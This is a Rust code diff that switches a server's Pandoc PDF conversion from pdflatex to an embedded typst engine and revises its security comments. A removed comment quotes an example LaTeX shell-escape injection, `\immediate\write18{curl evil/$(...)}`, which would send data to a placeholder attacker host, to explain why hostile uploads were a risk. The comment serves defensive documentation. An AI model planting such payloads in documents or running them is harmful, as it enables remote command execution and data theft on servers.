@@ -44,20 +44,33 @@ pub async fn convert_to_pdf(
 ) -> Result<(), AppError> {
     let pandoc_path = find_pandoc()?;
 
-    // SECURITY: pdflatex defaults (in texlive-full) honor `\write18{cmd}`
-    // and `\immediate\write18{cmd}` macros to run arbitrary shell commands
-    // as the server uid. A hostile DOCX / PPTX / RTF / ODT upload could
-    // embed `\immediate\write18{curl evil/$(...)}` and Pandoc would route
-    // it through pdflatex unchanged. Closes 05-file F-01 (Critical).
+    // ENGINE: use typst (not pdflatex / xelatex). pdflatex's default
+    // 8-bit encoding chokes on arbitrary Unicode the moment a doc
+    // contains common symbols like ≥, ≤, →, π, etc. — it raises
+    // `LaTeX Error: Unicode character … not set up for use with
+    // LaTeX` and produces no PDF. Real-world DOCX / RTF / ODT
+    // uploads hit this constantly (any technical / scientific text).
     //
-    // The fix passes `-no-shell-escape` as a pdflatex option via
-    // Pandoc's `--pdf-engine-opt`, which Pandoc forwards verbatim to the
-    // engine. We also set `openout_any=p` so pdflatex can only write
-    // into paths underneath the current working directory (which is the
-    // server's temp dir for this conversion).
+    // typst reads UTF-8 natively, ships as a single static binary
+    // we embed via include_bytes! (build_helper/typst.rs +
+    // utils/embedded.rs), and is supported by pandoc as a first-
+    // class PDF engine since pandoc 3.1.7. Picking typst over
+    // xelatex avoids bundling the entire TeX Live distribution —
+    // critical for the self-contained-binary distribution model.
+    //
+    // We pass `--pdf-engine` the FULL PATH to the extracted typst
+    // binary so pandoc doesn't need it on PATH at runtime.
+    //
+    // The shell-escape / openout_any environment hardening below is
+    // a no-op for typst (typst has no equivalent of LaTeX's
+    // `\write18`), but it's kept in place for defense-in-depth in
+    // case a future operator switches the engine back to xelatex
+    // without re-reading this comment.
+    //
     // SECURITY: wall-clock timeout via tokio::time::timeout around
     // spawn_blocking. The Command's child is killed via Drop on the
     // JoinHandle when the timeout fires. Closes 05-file F-09 (Medium).
+    let typst_path = super::embedded::get_typst_path()?.clone();
     let pandoc_path = pandoc_path.clone();
     let input_path = input_path.clone();
     let output_path = output_path.clone();
@@ -69,9 +82,7 @@ pub async fn convert_to_pdf(
                 .arg(&input_path)
                 .arg("-o")
                 .arg(&output_path)
-                .arg("--pdf-engine=pdflatex")
-                .arg("--pdf-engine-opt=-no-shell-escape")
-                .arg("--pdf-engine-opt=-interaction=nonstopmode")
+                .arg(format!("--pdf-engine={}", typst_path.display()))
                 .env("openout_any", "p")
                 .env("openin_any", "p")
                 .output()
